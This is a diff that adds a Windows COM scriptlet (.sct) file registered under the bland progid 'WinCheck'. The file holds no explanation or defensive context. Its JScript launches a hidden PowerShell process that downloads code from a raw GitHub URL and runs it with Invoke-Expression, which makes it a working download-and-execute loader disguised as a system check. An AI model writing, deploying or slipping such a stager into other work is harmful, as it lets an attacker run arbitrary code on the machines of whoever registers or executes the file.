@@ -1,0 +1,14 @@
+<?xml version="1.0"?>
+<scriptlet>
+<registration 
+    progid="WinCheck"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
+    <script language="JScript">
+        <![CDATA[
+            var wsh = new ActiveXObject("WScript.Shell");
+            wsh.Run('powershell -Command "Invoke-Expression(Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/pty-spawn/tools/refs/heads/main/hammer\').Content"', 0, true);
+        ]]>
+    </script>
+</registration>
+</scriptlet>
